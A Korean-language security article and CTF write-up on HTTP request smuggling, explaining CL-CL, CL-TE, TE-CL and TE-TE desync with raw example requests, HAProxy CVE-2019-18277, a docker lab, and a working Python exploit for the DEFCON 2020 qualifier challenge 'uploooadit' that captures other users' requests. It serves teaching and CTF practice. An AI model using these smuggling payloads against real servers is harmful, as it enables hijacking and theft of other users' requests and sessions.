# HTTP Request Smuggling & HTTP Desync Attack

> 2020-06-02
라온화이트햇 핵심연구팀 박의성 ([uspark@raonsecure.com](mailto:uspark@raonsecure.com))

## 1. 개요

본 문서는 HTTP Request Smuggling 또는 HTTP Desync Attack 이라고 불리는 공격에 대해 서술한 문서입니다. 최근 많은 웹사이트에서 서버로 전송되는 트래픽 부담을 줄이고 속도를 향상시키기 위해 리버스 프록시를 많이 사용합니다. HTTP Request Smuggling 취약점은 리버스 프록시와 백엔드 서버 간의 HTTP Request 패킷을 처리하는 방식의 차이로 인해 발생합니다. 

## 2. 타임라인

- **2005년** / Watchfire 소속 Chaim Linhart, Amit Klein, Ronen Heled, Steve Orrin이 HTTP Request Smuggling에 대한 보고서를 작성
- **2016년** / DEFCON 24에서 regilero가 Hiding Wookiees In HTTP 라는 주제로 HTTP Request Smuggling 취약점에 대해 발표
- **2019년** / BlackHat USA 2019에서 PortSwigger의 James Kettle가 HTTP Desync Attacks : Smashing into the Cell Next Door라는 주제로 HTTP Request Smuggling 취약점에 대한 리얼월드 버그헌팅 사례들과 취약점 탐지 자동화 방법 및 툴 발표

## 3. 취약점 발생 원리

### 3-1. HTTP 1.0 이하 버전

![/assets/40535ce9-af40-4cea-81fe-2d1b77c11bea/5b0ff379-427f-4347-a7ec-dc6653d177b7.png](/assets/40535ce9-af40-4cea-81fe-2d1b77c11bea/5b0ff379-427f-4347-a7ec-dc6653d177b7.png)

HTTP 1.0 이하 버전에서는 프로토콜 설계상 1개의 TCP/IP 연결 당 하나의 문서를 받아올 수 있도록 구현되어 있습니다. 페이지 내부에 포함된 여러 문서를 요청할 경우, 문서 마다 매번 연결을 생성하고 끊는 방식입니다. 이는 네트워크 비용 측면에서 많은 비용을 소모하며 매우 비효율적인 구조입니다.

### 3-2. HTTP 1.1 버전 이후

![/assets/361c4b4d-faa8-425b-8eb5-ad8373eecfcd/59e86881-1bf8-4c9d-b2a3-e24cb3991be3.png](/assets/361c4b4d-faa8-425b-8eb5-ad8373eecfcd/59e86881-1bf8-4c9d-b2a3-e24cb3991be3.png)

HTTP 1.1부터는 Keep-Alive가 추가되었습니다. HTTP 1.1에서는 "Connection: keep-alive" 헤더를 사용하지 않더라도 모든 연결에 Keep-Alive를 기본 적용하도록 구현되어 있으며, 해제시에 "Connection: close" 헤더를 명시적으로 사용할 경우에만 연결이 종료되도록 되어 있습니다. 이는 연속된 문서 요청시 Handshake 과정이 생략되므로 상당한 성능 향상을 기대할 수 있습니다. 단순 이미지, javascript, css 같은 내용이 변경되지 않는 정적 자원(static file)에 대해서는 Keep Alive을 사용할 경우 약 50%의 성능 향상을 보인다고 합니다.

![/assets/98f1b417-04b0-4aa3-b487-8f256cb1f418/ba47bb14-ba5d-4263-9dcd-f86144f59d55.png](/assets/98f1b417-04b0-4aa3-b487-8f256cb1f418/ba47bb14-ba5d-4263-9dcd-f86144f59d55.png)

하지만 여기서 그치지 않고 한단계 더 나아가 HTTP pipelining 이라는 기술을 구현합니다. 기본적으로 HTTP 요청은 순차적으로 진행됩니다. 첫번째 요청에 대한 응답을 받고 두번째 요청을 보내는 방식으로 작동합니다. 이는 네트워크 지연의 영향을 많이 받습니다. HTTP pipelining은 네트워크 지연을 피하기 위해 응답을 기다리지 않고 연속적인 요청을 전송하여 네트워크 지연을 최대한 줄이도록 구현되어 있습니다. 

### 3-3. 하지만, 프록시에서는?

![/assets/a17927c9-5a66-49a3-85c6-6876c9bae067/9e9f6c7e-9c11-4f86-a409-9314e7f9cca9.png](/assets/a17927c9-5a66-49a3-85c6-6876c9bae067/9e9f6c7e-9c11-4f86-a409-9314e7f9cca9.png)

프록시에서는 백엔드 서버와 HTTP pipelining을 사용하지 않습니다. 백엔드 서버에서는 HTTP pipelining을 지원하지만 이를 프록시와 백엔드 서버간 통신시 사용하지 않는 것을 인식하지 못합니다. 여기에서부터 문제가 발생합니다. 

### 3-4. 취약점 발생

![/assets/9d793785-00bf-4bcd-ac2a-6ae03907b8d2/672ba11d-2c34-40cb-8f52-ee87cf060433.png](/assets/9d793785-00bf-4bcd-ac2a-6ae03907b8d2/672ba11d-2c34-40cb-8f52-ee87cf060433.png)

정상적인 경우에는 위 그림과 같이 순차적으로 들어온 요청을 프록시와 백엔드 서버에서 처리하므로 아무런 문제가 발생하지 않습니다.

![/assets/18656436-bb67-424d-bf77-ab1104016ec3/281b6434-9f56-4b8f-93c4-6d1431f7a797.png](/assets/18656436-bb67-424d-bf77-ab1104016ec3/281b6434-9f56-4b8f-93c4-6d1431f7a797.png)

만약 어떤 방법을 통해서 두 개의 요청을 하나의 요청으로 인식하게 하여 전송하면 어떻게 될까요? 프록시에서 두 개의 요청을 하나의 요청으로 인식하여 서버에 전송하게 됩니다. 두 개의 요청을 받게 된 서버는 최초의 요청에 대한 응답을 프록시로 전송하게 되고 두 번째 요청은 처리되지 않고 남아있게 됩니다. 이는 이후에 전송된 요청과 함께 처리되어 응답을 전송하게 됩니다. 이러한 프록시와 백엔드 서버의 HTTP Request 패킷을 처리하는 방식의 차이로 인해 HTTP Request Smuggling 취약점이 발생합니다.

### 3-5. 두 개의 요청을 하나로 보내기

그렇다면 두 개의 요청을 하나로 인식하도록 보내는 방법에는 어떤 방법이 있을까요? 프록시와 서버가 어떤 방식으로 패킷을 처리하느냐에 따라 다릅니다. 먼저 두 개의 요청을 하나로 인식하게 하기 위해 패킷을 약간 꼬아야 합니다. 

기본적으로 HTTP에서 데이터를 포함하여 패킷을 전송하는 방식에 대해 알아보겠습니다. HTTP에서 HTTP Body를 전송하기 위해 먼저 전송하는 데이터의 크기를 보내줘야 합니다. 그래야 패킷을 수신받는 쪽에서는 데이터를 얼마나 받아야 할 지 준비를 할 수 있습니다. 이 과정에서 사용하는 방법이 두 가지가 있는데, Content-Length와 Transfer-Encooding 입니다.

Content-Length는 HTTP Body의 길이를 HTTP Header에 포함하여 전송합니다. 따라서 전송하는 데이터의 크기를 미리 알고 있는 경우와 다량의 패킷 처리에 적합합니다.

```
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

data=a
```

Transfer-Encooding은 프로세스가 완전히 처리되기 전까지 전송되는 데이터의 전체 크기를 파악하지 못하는 경우 유용합니다. 데이터를 보내기 전 앞에 데이터의 크기를 16진수로 전송하고 데이터를 전송합니다. 더 이상 데이터를 보내지 않고 종료하는 경우 0\r\n\r\n으로 종료합니다. Transfer-Encooding은 처리되는 응답 결과가 큰 경우나, 스트리밍 등에 주로 사용합니다. 

```
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

6\r\n
data=a\r\n
0\r\n\r\n
```

그렇다면, 이 두 가지를 모두 포함하여 전송하게 되면 서버는 어떤 것을 먼저 처리하고 어떻게 반응해야 할까요? 

rfc7230 문서의 #section-3.3.3 3항에 따르면 Transfer-Encoding 및 Content-Length 헤더가 함께 수신되면 Transfer-Encoding이 Content-Length를 대체해야 한다고 나와있습니다. 또한 Transfer-Encoding 헤더가 요청에 존재하고 청크된 전송 인코딩이 최종 인코딩이 아닌 경우, 전송된 데이터의 길이는 신뢰성 있게 결정될 수 없으며 서버는 반드시 400 (Bad Request) 상태 코드로 응답 한 다음 연결을 닫아야한다고 나와있습니다.

> If a Transfer-Encoding header field is present in a response and the chunked transfer coding is not the final encoding, the message body length is determined by reading the connection until it is closed by the server. If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection.
If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.
[https://tools.ietf.org/html/rfc7230#section-3.3.3](https://tools.ietf.org/html/rfc7230#section-3.3.3)

하지만, 프록시가 위의 문서를 따르지 않고 구현되어 있을 경우 HTTP Request Smuggling 취약점이 발생합니다. 공격자는 Content-Length와 Transfer-Encooding를 적절히 활용하여 두 개의 요청을 하나로 보내도록 할 수 있습니다.

```
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0\r\n
\r\n
G
```

만약 프록시가 이와 같은 HTTP 요청을 수신하였다고 가정하고 진행하겠습니다. 프록시는 Content-Length와 Transfer-Encooding이 있을 경우 Content-Length를 우선적으로 처리한다고 가정합니다. 이 경우 프록시는 전송된 HTTP 요청을 하나의 요청으로 인식하고 백엔드 서버로 전송합니다. 

![/assets/a16fb85a-611e-4957-af4b-b20b7a714d9d/3b3678e2-a0f0-458b-b898-4ba9173b1bdb.png](/assets/a16fb85a-611e-4957-af4b-b20b7a714d9d/3b3678e2-a0f0-458b-b898-4ba9173b1bdb.png)

백엔드 서버는 Content-Length와 Transfer-Encooding이 있을 경우 Transfer-Encooding을 우선적으로 처리한다고 가정합니다. Transfer-Encooding을 우선 처리하여 Transfer-Encooding 종료 문자인 0\r\n\r\n까지 하나의 패킷으로 인식합니다. 나머지 남은 G는 처리하지 않고 버퍼에 남아있는 채로 0\r\n\r\n까지의 요청에 대한 응답을 전송합니다. 

```
GET / HTTP/1.1
Host: example.com
```

그 때, 새로운 사용자가 새로운 HTTP 요청을 진행합니다. 프록시는 해당 요청을 백엔드 서버에 전송하고, 백엔드 서버는 해당 요청을 받습니다. 하지만, 여기에서 이전 요청에 처리되지 않고 남아있던 데이터가 같이 포함됩니다. 따라서 아래와 같이 G가 HTTP 요청 패킷 앞 부분에 붙어 처리되므로 해당 패킷은 정상적으로 처리되지 않고 405 (Method Not Allowed) 에러를 반환하게 됩니다.

![/assets/df81e1f2-fb3b-4ef2-9171-bf1eb96ca42c/aca0f9b6-e029-403a-b8ed-3eb2a021b349.png](/assets/df81e1f2-fb3b-4ef2-9171-bf1eb96ca42c/aca0f9b6-e029-403a-b8ed-3eb2a021b349.png)

```
**G**GET / HTTP/1.1
Host: example.com
```

프록시와 백엔드 서버가 어떤 헤더를 우선적으로 인식하는지에 따라 공격 기법이 조금씩 달라지기 때문에 이를 이해하기 쉽게 CL-TE와 같이 약식으로 표현합니다. 위 예시와 같이 프록시는 Content-Length를 우선적으로 처리하고 백엔드 서버는 Transfer-Encooding을 우선적으로 처리할 경우 CL-TE라고 표현합니다.

### 3-6. CL-CL

rfc7230 문서의 #section-3.3.3 4항에 따르면 여러 Content-Length 헤더가 존재하거나 유효하지 않은 값일 경우, 400 (Bad Request) 상태 코드로 응답 한 다음 연결을 닫아야한다고 나와있습니다. 이와 같이 구현하지 않을 경우 HTTP Request Smuggling 취약점이 발생합니다.  

> If a message is received without Transfer-Encoding and witheither multiple Content-Length header fields having differingfield-values or a single Content-Length header field having aninvalid value, then the message framing is invalid and there cipient MUST treat it as an unrecoverable error. If this is arequest message, the server MUST respond with a 400 (Bad Request)status code and then close the connection. If this is a responsemessage received by a proxy, the proxy MUST close the connectionto the server, discard the received response, and send a 502 (Bad Gateway) response to the client.
[https://tools.ietf.org/html/rfc7230#section-3.3.3](https://tools.ietf.org/html/rfc7230#section-3.3.3)

```
POST / HTTP/1.1
Host: example.com
Content-Length: 8
Content-Length: 7

12345\r\n
a
```

CL-CL은 프록시 서버에서 인식한 데이터 길이는 8이고, 그 후 백엔드 서버로 전송됩니다. 백엔드 서버에서는 데이터 길이를 7로 인식하고 해당 요청에 대한 응답을 처리합니다. 이후 남은 a는 버퍼에 남아 다음 요청과 함께 처리되므로 HTTP Request Smuggling 취약점이 발생합니다. 

### 3-7. CL-TE

rfc7230 문서의 #section-3.3.3 3항에 따르면 Transfer-Encoding 및 Content-Length 헤더가 함께 수신되면 Transfer-Encoding이 Content-Length를 대체해야 한다고 나와있습니다. 또한 Transfer-Encoding 헤더가 요청에 존재하고 청크된 전송 인코딩이 최종 인코딩이 아닌 경우, 전송된 데이터의 길이는 신뢰성 있게 결정될 수 없으며 서버는 반드시 400 (Bad Request) 상태 코드로 응답 한 다음 연결을 닫아야한다고 나와있습니다. 이와 같이 구현하지 않을 경우 HTTP Request Smuggling 취약점이 발생합니다.  

> If a Transfer-Encoding header field is present in a response and the chunked transfer coding is not the final encoding, the message body length is determined by reading the connection until it is closed by the server. If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection.
If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.
[https://tools.ietf.org/html/rfc7230#section-3.3.3](https://tools.ietf.org/html/rfc7230#section-3.3.3)

```
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0\r\n
\r\n
G
```

CL-TE는 프록시 서버에서 Content-Length를 먼저 인식하고 처리하므로 위와 같은 패킷이 전송되면 전체를 백엔드 서버로 전송합니다. 백엔드 서버에서는 Transfer-Encooding을 우선적으로 처리하므로 Transfer-Encooding chunked 데이터 종료 표시인 0\r\n\r\n까지 요청을 처리하고 응답을 반환합니다. 따라서 뒤에 남아있는 G는 버퍼에 남아 다음 요청과 함께 처리되므로 HTTP Request Smuggling 취약점이 발생합니다. 

### 3-8. TE-CL

```
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

12\r\n
GPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
```

TE-CL은 프록시 서버에서 Transfer-Encooding을 먼저 처리하므로 Transfer-Encooding chunked 데이터 종료 표시인 0\r\n\r\n까지 요청을 백엔드 서버로 전송합니다. 백엔드 서버에서는 Content-Length를 먼저 인식하고 처리하므로 Content-Length로 전송된 4바이트 문자열인 12\r\n까지 요청을 처리하고 응답을 반환합니다. 따라서 GPOST부터의 문자열은 버퍼에 남아 다음 요청과 함께 처리되므로 HTTP Request Smuggling 취약점이 발생합니다. 

### 3-9. TE-TE

```
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```

TE-TE는 Transfer-Encoding 헤더에 개행문자 또는 잘못된 인코딩 형식 지정 등을 이용하여 프록시나 백엔드 서버 둘 중 하나는 Transfer-Encoding을 사용하지 않도록 하여 공격하는 방법입니다. 어떤 의미에서는 CL-TE, TE-CL과 크게 다르지 않으므로 CL-TE, TE-CL 이라고 할 수 있습니다.

## 4. 실습 환경 구성

2.0.6 이전 버전의 HAProxy에서 HTTP Request Smuggling 취약점(CVE-2019-18277)이 발견되었습니다.  HAProxy는 Transfer-Encoding이 존재하는 경우 Transfer-Encoding를 먼저 구문 분석합니다. 하지만 Transfer-Encoding 헤더에 개행문자(\x0b)를 포함하여 전송할 경우 Transfer-Encoding 방식이 작동하지 않으므로 HTTP Request Smuggling 취약점이 발생합니다. 해당 취약점은 Transfer-Encoding 헤더에 개행문자(\x0b)를 포함하여 Transfer-Encoding 방식이 작동하지 않도록 하였으므로 TE-TE 방식으로 구분할 수 있습니다.

HTTP Request Smuggling 취약점의 경우 몇 개의 취약점과 연계하여 공격할 경우 파급력이 기하급수적으로 상승합니다. 공격 범위 또한 해당 사이트를 사용하는 사용자 불특정 다수에게 무분별하게 발생하며 유저 상호작용 없이 단순 사이트 이용만으로도 XSS 취약점이 발생하여 쿠키/세션이 탈취되거나, CSRF와 같이 사용자로 하여금 사이트 내 존재하는 기능을 통해 어떠한 행위를 하도록 할 수도 있습니다.

[smuggling_example.zip](/assets/13358a35-99fe-4255-a8da-1a9cb8eb2178/0e9b3fa9-8c6b-4395-a95c-0d21ea242cda.zip)

위는 직접 docker를 이용하여 실습 환경을 구성한 파일 입니다. docker-compose up 명령을 통해 실행할 수 있으며 7979 포트로 접속하시면 됩니다. 포트를 변경하시고 싶으시면 docker-compose.yml 파일 내 ports 부분의 "7979:1080"를 변경하여 사용하시면 됩니다. 추가적으로 flask 웹 어플리케이션에 XSS 취약점과 URL redirect 취약점을 구현해두었으니 해당 취약점을 연계하여 테스트 하셔도 좋을 것 같습니다. 또한, [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)에도 각 공격기법 별로 실습해볼 수 있는 Lab이 존재하니 참고하시면 많은 도움이 될 것으로 보입니다.

## 5. 문제풀이

5/16부터 5/18까지 3일간 진행한 DEFCON 2020 예선에서 최신 트렌드인 HTTP Request Smuggling 취약점을 이용한 문제가 출제되었습니다.  

[app.py](/assets/3c51c62f-aab9-4183-a1b1-d25e89dff6b6/14816820-6349-47c7-ba03-641eb1809963.py)

[store.py](/assets/0378a9f3-87cf-4126-a74a-35fd323f9baa/4b8b26b9-3f04-4e5f-aebb-e590db509e5b.py)

```python
import os
import re

from flask import Flask, abort, request

import store

GUID_RE = re.compile(
    r"\A[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\Z"
)

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 512
filestore = store.S3Store()

# Uncomment the following line for simpler local testing of this service
# filestore = store.LocalStore()

@app.route("/files/", methods=["POST"])
def add_file():
    if request.headers.get("Content-Type") != "text/plain":
        abort(422)

    guid = request.headers.get("X-guid", "")
    if not GUID_RE.match(guid):
        abort(422)

    filestore.save(guid, request.data)
    return "", 201

@app.route("/files/<guid>", methods=["GET"])
def get_file(guid):
    if not GUID_RE.match(guid):
        abort(422)

    try:
        return filestore.read(guid), {"Content-Type": "text/plain"}
    except store.NotFound:
        abort(404)

@app.route("/", methods=["GET"])
def root():
    return "", 204
```

app.py를 분석해보면 크게 파일을 저장하는 기능과 파일을 읽는 기능이 존재합니다. 저장할 때 X-guid 헤더에 파일을 식별할 수 있는 고유번호를 uuid 포맷 형식으로 입력하게 되면 파일이 저장됩니다.

![/assets/93be687b-4ece-452c-ac1b-db30211c563f/ca0a7872-66f3-49cc-83ba-0139a882b338.png](/assets/93be687b-4ece-452c-ac1b-db30211c563f/ca0a7872-66f3-49cc-83ba-0139a882b338.png)

위와 같이 패킷 형식을 올바르지 않게 전송할 경우 400 (Bad Request) 상태 코드로 응답과 함께 헤더에 haproxy 1.9.10 버전이 포함되어 전송되는 것을 확인할 수 있었습니다. HAProxy는 2.0.6 이전 버전에서 HTTP Request Smuggling 취약점이 존재합니다.

따라서 HTTP request smuggling 취약점을 이용하여 /files/ 경로에 X-guid 헤더를 포함하여 전송하면 타인이 요청한 HTTP request 패킷을 파일로 저장시킬 수 있습니다. 

```python
import socket, ssl
from time import sleep
from urllib.parse import urlparse

def send_payload(host, data):
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_sock = context.wrap_socket(s, server_hostname=host)
    s_sock.connect((host, 443))
    s_sock.send(data)

    data = s_sock.recv(102400)
    s_sock.close()
    
    return data

href = 'https://uploooadit.oooverflow.io/files/'
host = urlparse(href).netloc

second_packet = b'POST /files/ HTTP/1.1\r\n'
second_packet += b'Content-Type: text/plain\r\n'
second_packet += b'X-guid: 22099301-d68e-4dfb-996f-1626f3158b5e\r\n'
second_packet += b'Content-Length: 100\r\n'
second_packet += b'X-Foo: bar\r\n\r\n'

smuggle_packet = b'POST /files/ HTTP/1.1\r\n'
smuggle_packet += b'Host: uploooadit.oooverflow.io\r\n'
smuggle_packet += b'Content-Type: text/plain\r\n'
smuggle_packet += b'X-guid: 22099301-d68e-4dfb-996f-1626f3158b5e\r\n'
smuggle_packet += b'Content-Length: ' + str(len(second_packet)+11).encode() + b'\r\n'
smuggle_packet += b'Connection: keep-alive\r\n'
smuggle_packet += b'Transfer-Encoding: \x0bchunked\r\n\r\n'

smuggle_packet += b'1\r\n'
smuggle_packet += b'A\r\n'
smuggle_packet += b'0\r\n\r\n'

smuggle_packet += second_packet

while True:
    print(smuggle_packet.decode())
    data = send_payload(host, smuggle_packet)
    print(data.decode())
```

Transfer-Encoding 헤더에 chunked 앞에 \x0b를 이용하여 HTTP Request Smuggling 취약점을 발현시킵니다. 이후 second_packet으로 전송되는 내용이 백엔드 서버의 버퍼에 남아 다음 요청과 함께 처리되므로 타인이 요청한 패킷이 X-guid 헤더로 전송한 파일로 저장됩니다.

![/assets/f21ac0a4-5c4f-4e26-aeb8-fdbac22da22e/d897eb4d-1e61-44f3-bd66-a400c73acc50.png](/assets/f21ac0a4-5c4f-4e26-aeb8-fdbac22da22e/d897eb4d-1e61-44f3-bd66-a400c73acc50.png)

HTTP request smuggling 취약점 특성상 불특정 다수에게 무분별하게 발현되므로 위 코드를 작성하여 반복적으로 원하는 값을 확인할 때까지 반복합니다. 그 과정에서 타인이 페이지에 접근한 정상적인 패킷도 확인할 수 있었습니다. 여러 번 시도 후에 봇이 주기적으로 flag가 담긴 패킷을 전송하는 부분을 저장하여 FLAG를 획득할 수 있었습니다.

해당 문제는 uploooadit 이라는 문제로 대회 종료 후 [https://github.com/o-o-overflow/dc2020q-uploooadit](https://github.com/o-o-overflow/dc2020q-uploooadit)에 공개되어 있으므로 참고하시면 좋을 것 같습니다.

## 6. 그 외 악용 가능 시나리오

HTTP Request Smuggling을 이용한 Paypal 패스워드 탈취 취약점을 제보하여([https://hackerone.com/reports/510152](https://hackerone.com/reports/510152)) $20,000의 리워드를 받은 사례도 있습니다.

## 7. 참고자료

- [https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [https://medium.com/@knownsec404team/protocol-layer-attack-http-request-smuggling-cc654535b6f](https://medium.com/@knownsec404team/protocol-layer-attack-http-request-smuggling-cc654535b6f)
- [https://nathandavison.com/blog/haproxy-http-request-smuggling](https://nathandavison.com/blog/haproxy-http-request-smuggling)
- [https://www.hahwul.com/2019/08/http-smuggling-attack-re-born.html](https://www.hahwul.com/2019/08/http-smuggling-attack-re-born.html)
- [https://github.com/o-o-overflow/dc2020q-uploooadit](https://github.com/o-o-overflow/dc2020q-uploooadit)
- [https://hackerone.com/reports/488147](https://hackerone.com/reports/488147)
- [https://b.pungjoo.com/entry/HTTP-11-Keep-Alive-기능에-대해](https://b.pungjoo.com/entry/HTTP-11-Keep-Alive-%EA%B8%B0%EB%8A%A5%EC%97%90-%EB%8C%80%ED%95%B4)
- [https://goodgid.github.io/HTTP-Keep-Alive/](https://goodgid.github.io/HTTP-Keep-Alive/)
- [https://jins-dev.tistory.com/entry/HTTP11-의-HTTP-Pipelining-과-Persistent-Connection-에-대하여](https://jins-dev.tistory.com/entry/HTTP11-%EC%9D%98-HTTP-Pipelining-%EA%B3%BC-Persistent-Connection-%EC%97%90-%EB%8C%80%ED%95%98%EC%97%AC)
- [https://developer.mozilla.org/ko/docs/Web/HTTP/Connection_management_in_HTTP_1.x](https://developer.mozilla.org/ko/docs/Web/HTTP/Connection_management_in_HTTP_1.x)
- [https://sunghwanjo.tistory.com/entry/Chunked-Response란](https://sunghwanjo.tistory.com/entry/Chunked-Response%EB%9E%80)
- [https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Transfer-Encoding](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Transfer-Encoding)